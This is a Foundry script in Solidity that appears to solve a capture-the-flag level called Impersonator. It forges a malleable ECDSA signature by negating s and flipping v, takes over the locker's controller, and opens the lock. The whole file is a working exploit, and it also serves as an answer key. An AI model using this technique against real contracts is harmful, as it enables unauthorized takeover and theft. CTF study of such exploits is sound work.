// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "../src/Impersonator.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract ImpersonatorSolution is Script {
    Impersonator public impersonator = Impersonator(0xDaEdB1A93434c8732aE38C0fE395d63835f11d40);

    uint256 constant N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    // await contract.lockers(0)
    ECLocker public ecLocker = ECLocker(0xA2204ee461487a0520041f20fdfceAf02226178a);

    function createMalleableSignature(
        bytes32 r,
        bytes32 s,
        uint8 v
    ) public pure returns (bytes32, bytes32, uint8) {
        bytes32 negS = bytes32(N - uint256(s));
        uint8 vPrime = (v == 27) ? 28 : 27;

        return (r, negS, vPrime);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner : ", impersonator.owner());
        console.log("LockCounter : ", impersonator.lockCounter());
        console.log("Used Signatures : ", ecLocker.usedSignatures(bytes32(0)));
        console.log("Before Lock Controller : ", ecLocker.controller());

        uint8 v = 27;
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        (bytes32 rPrime, bytes32 negS, uint8 vPrime) = createMalleableSignature(r, s, v);

        ecLocker.changeController(vPrime, rPrime, negS, address(0));

        console.log("After Lock Controller : ", ecLocker.controller());

        ecLocker.open(100, 0x0, 0x0);

        vm.stopBroadcast();
    }
}